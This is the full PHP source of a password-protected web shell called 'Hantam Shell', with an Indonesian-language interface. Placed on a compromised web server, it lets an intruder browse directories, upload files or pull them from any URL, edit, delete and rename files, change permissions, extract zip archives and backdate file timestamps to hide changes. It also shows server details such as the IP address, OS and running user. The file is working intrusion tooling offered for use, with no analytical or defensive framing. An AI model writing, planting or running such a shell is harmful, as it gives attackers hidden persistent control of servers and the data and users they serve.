<?php
session_start();
error_reporting(0);
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}
$panel_password = 'kucing123';
if (!isset($_SESSION['auth'])) {
    if (isset($_POST['panel_pass']) && $_POST['panel_pass'] === $panel_password) {
        $_SESSION['auth'] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
    echo '<form method="post" style="margin:100px auto;text-align:center;font-family:sans-serif;">
        <input type="password" name="panel_pass" placeholder="Password" style="padding:5px;font-size:10px;">
        <button type="submit" style="padding:5px 10px;font-size:10px;">Login</button>
    </form>';
    exit;
}
if (isset($_GET['cd']) && is_dir($_GET['cd'])) {
    chdir($_GET['cd']);
}
$currentDir = getcwd();
if (isset($_POST['do_upload']) && isset($_FILES['upload_file'])) {
    move_uploaded_file($_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['name']);
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}
if (isset($_POST['do_url_upload']) && isset($_POST['upload_url'])) {
    $url = $_POST['upload_url'];
    $name = basename(parse_url($url, PHP_URL_PATH));
    file_put_contents($name, file_get_contents($url));
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}
if (isset($_GET['del'])) {
    $target = $_GET['del'];
    if (is_dir($target)) {
        rmdir($target);
    } else {
        unlink($target);
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}
if (isset($_POST['rename_old'], $_POST['rename_new'])) {
    rename($_POST['rename_old'], $_POST['rename_new']);
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}
if (isset($_GET['edit']) && is_file($_GET['edit'])) {
    $fileToEdit = $_GET['edit'];

    echo "<h2>Editing: $fileToEdit</h2>";
echo "<div style='background:#2a2a3b; padding:20px; border:1px solid #444; border-radius:8px;'>";
echo "<h2 style='margin-top:0;'>✏️ Editing: <span style='color:#4ea8ff;'>$fileToEdit</span></h2>";

if (isset($_POST['file_content'])) {
    if (is_writable($fileToEdit)) {
        if (file_put_contents($fileToEdit, $_POST['file_content']) !== false) {
            echo "<div style='color:#9f9; background:#1e2e1e; padding:10px; border:1px solid #393; margin-bottom:10px;'>✅ File berhasil disimpan.</div>";
        } else {
            echo "<div style='color:#f99; background:#2e1e1e; padding:10px; border:1px solid #933; margin-bottom:10px;'>❌ Gagal menyimpan file (write error).</div>";
        }
    } else {
        echo "<div style='color:#f99; background:#2e1e1e; padding:10px; border:1px solid #933; margin-bottom:10px;'>❌ File tidak bisa ditulis (permission denied).</div>";
    }
}

$content = htmlspecialchars(@file_get_contents($fileToEdit));
echo "<form method='post'>
    <textarea name='file_content' rows='20' style='width:100%; background:#1e1e2f; color:#ccc; border:1px solid #555; padding:10px; font-family:monospace; font-size:14px; border-radius:6px;'>$content</textarea><br>
    <button type='submit' style='margin-top:10px; padding:8px 16px; background:#4ea8ff; border:none; color:#fff; border-radius:6px; cursor:pointer;'>💾 Save</button>
</form>
<div style='margin-top:15px;'><a href='" . $_SERVER['PHP_SELF'] . "' style='color:#4ea8ff;'>← Kembali</a></div>";
echo "</div>";
exit;

}
if (isset($_POST['chmod_target'], $_POST['chmod_value'])) {
    chmod($_POST['chmod_target'], octdec($_POST['chmod_value']));
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}
if (isset($_POST['chdate_target'], $_POST['chdate_value'])) {
    touch($_POST['chdate_target'], strtotime($_POST['chdate_value']));
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}
if (isset($_POST['create_file']) && $_POST['create_file_name']) {
    $newFile = $_POST['create_file_name'];
    if (!file_exists($newFile)) file_put_contents($newFile, '');
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}
if (isset($_POST['create_folder']) && $_POST['create_folder_name']) {
    $newFolder = $_POST['create_folder_name'];
    if (!file_exists($newFolder)) mkdir($newFolder);
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}
if (isset($_GET['unzip'])) {
    $zipFile = $_GET['unzip'];
    if (file_exists($zipFile) && preg_match('/\.zip$/i', $zipFile)) {
        $zip = new ZipArchive;
        if ($zip->open($zipFile) === TRUE) {
            $extractPath = pathinfo($zipFile, PATHINFO_FILENAME);
            if (!is_dir($extractPath)) {
                mkdir($extractPath);
            }
            $zip->extractTo($extractPath);
            $zip->close();
        }
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}
?>
<style>
    body {
        background: #1e1e2f;
        color: #ccc;
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        padding: 20px;
    }
    h2 {
        margin-bottom: 10px;
        color: #fff;
    }
    table {
        width: 100%;
        border-collapse: collapse;
        background: #2a2a3b;
        box-shadow: 0 0 5px #000;
    }
    th, td {
        padding: 10px;
        border: 1px solid #444;
        font-size: 14px;
        vertical-align: top;
    }
    th {
        background: #333;
        color: #eee;
    }
    tr:hover {
        background: #333645;
    }
    a {
        color: #4ea8ff;
        text-decoration: none;
    }
    a:hover {
        text-decoration: underline;
    }
    .breadcrumb a {
        margin-right: 5px;
    }
    .breadcrumb a::after {
        content: '/';
        margin-left: 5px;
    }
    .breadcrumb a:last-child::after {
        content: '';
    }
    .top-tools {
        display: flex;
        flex-wrap: wrap;
        gap: 20px;
        margin: 10px 0;
    }
    .top-tools form {
        display: inline-block;
    }
    .top-tools input[type="text"],
    .top-tools input[type="file"] {
        padding: 6px;
        background: #1f1f2f;
        border: 1px solid #555;
        color: #ccc;
    }
    .top-tools button {
        padding: 6px 12px;
        background: #4ea8ff;
        border: none;
        color: #fff;
        cursor: pointer;
    }
    .top-tools button:hover {
        background: #368fd1;
    }
    .perm-0755, .perm-0644, .perm-0711 { color: #00ff99; }
    .perm-0777 { color: #ff4444; }
    .perm-0444, .perm-0555 { color: #ccc; }
    .perm-other { color: gold; }
</style>
<h2>♝Hantam Shell</h2>
<div style='text-align:right; margin-bottom:10px;'>
    <a href='?logout' style='color:#ff6666;'>Logout</a>
</div>
<?php
$ip = $_SERVER['SERVER_ADDR'] ?? gethostbyname(gethostname());
$user = get_current_user();
$system = php_uname();
$phpVer = PHP_VERSION;
$software = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';

echo "<div style='background:#2a2a3b;padding:15px;margin-bottom:15px;border:1px solid #444;font-size:14px;'>
    <strong>Information Server</strong><br>
    IP : $ip<br>
    System : $system<br>
    User : $user<br>
    PHP Version : $phpVer<br>
    Software : $software
</div>";
echo "<div class='breadcrumb'>📁 Dir: ";
$parts = explode(DIRECTORY_SEPARATOR, $currentDir);
$path = "";
foreach ($parts as $part) {
    if ($part === "") continue;
    $path .= "/" . $part;
    echo "<a href='?cd=" . urlencode($path) . "'>" . htmlspecialchars($part) . "</a>";
}
echo "</div>";
echo <<<TOOLS
<div class="top-tools">
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="upload_file">
        <button type="submit" name="do_upload">Upload</button>
    </form>
    <form method="post">
        <input type="text" name="upload_url" placeholder="URL file">
        <button type="submit" name="do_url_upload">Upload From URL</button>
    </form>
    <form method="post">
        <input type="text" name="create_file_name" placeholder="Nama File">
        <button type="submit" name="create_file">Create File</button>
    </form>
    <form method="post">
        <input type="text" name="create_folder_name" placeholder="Nama Folder">
        <button type="submit" name="create_folder">Create Folder</button>
    </form>
</div>
TOOLS;
echo "<table>
    <thead>
        <tr>
            <th>Name</th>
            <th>Size</th>
            <th>Last Modified</th>
            <th>Permissions</th>
            <th>Actions</th>
        </tr>
    </thead>
    <tbody>";
echo "<tr>
    <td>📁 <a href='?cd=" . urlencode(dirname($currentDir)) . "'>..</a></td>
    <td>-</td>
    <td>" . date("F d Y H:i:s", filemtime("..")) . "</td>
    <td class='perm-other'>" . substr(sprintf('%o', fileperms("..")), -4) . "</td>
    <td><a href='?cd=" . urlencode(dirname($currentDir)) . "'>Select</a></td>
</tr>";
$folders = [];
$files = [];
foreach (scandir('.') as $file) {
    if ($file === ".") continue;
    if (is_dir($file)) {
        $folders[] = $file;
    } else {
        $files[] = $file;
    }
}
sort($folders);
sort($files);
$allItems = array_merge($folders, $files);
foreach ($allItems as $file) {
    $isDir = is_dir($file);
    $size = $isDir ? '-' : formatSize(filesize($file));
    $mtime = date("F d Y H:i:s", filemtime($file));
    $perms = substr(sprintf('%o', fileperms($file)), -4);
    $permClass = in_array($perms, ['0755','0644','0711']) ? 'perm-0755' :
                 ($perms === '0777' ? 'perm-0777' :
                 (in_array($perms, ['0444','0555']) ? 'perm-0444' : 'perm-other'));
    $icon = $isDir ? '📁' : (preg_match('/\\.php$/i', $file) ? '🐘' :
             (preg_match('/\\.html?$/i', $file) ? '🌐' :
             (preg_match('/\\.txt$/i', $file) ? '📄' : '📦')));
    $nameDisplay = "$icon " . ($isDir ? "<a href='?cd=" . urlencode($file) . "'>$file</a>" : $file);
    echo "<tr>
        <td>$nameDisplay</td>
        <td>$size</td>
        <td>$mtime</td>
        <td class='$permClass'>$perms</td>
        <td>
            <details><summary>Select</summary>
                <a href='?edit=" . urlencode($file) . "'>Edit</a><br>
                <form method='post'>
                    <input type='hidden' name='rename_old' value='$file'>
                    <input type='text' name='rename_new' value='$file' size='10'>
                    <button type='submit'>Rename</button>
                </form><br>
                <form method='post'>
                    <input type='hidden' name='chmod_target' value='$file'>
                    <input type='text' name='chmod_value' size='4' placeholder='0644'>
                    <button type='submit'>CHMOD</button>
                </form><br>
                <form method='post'>
                    <input type='hidden' name='chdate_target' value='$file'>
                    <input type='text' name='chdate_value' size='16' placeholder='2025-07-20 13:00'>
                    <button type='submit'>ChDate</button>
                </form><br>
                <a href='?del=" . urlencode($file) . "' onclick=\"return confirm('Hapus $file?');\">Delete</a><br>";
    if (!$isDir) echo "<a href='$file' download>Download</a><br>";
    if (!$isDir && preg_match('/\\.zip$/i', $file)) echo "<a href='?unzip=" . urlencode($file) . "'>Unzip</a>";
    echo "</details></td></tr>";
}
echo "</tbody></table>";
echo "<div style='text-align:center; margin-top:30px; font-size:13px; color:#888;'>
    2025 © Hantam Shell | Created By Njun.
</div>";
function formatSize($bytes) {
    $sizes = array('B','KB','MB','GB','TB');
    $i = 0;
    while ($bytes >= 1024 && $i < count($sizes)-1) {
        $bytes /= 1024;
        $i++;
    }
    return round($bytes,2) . ' ' . $sizes[$i];
}
?>
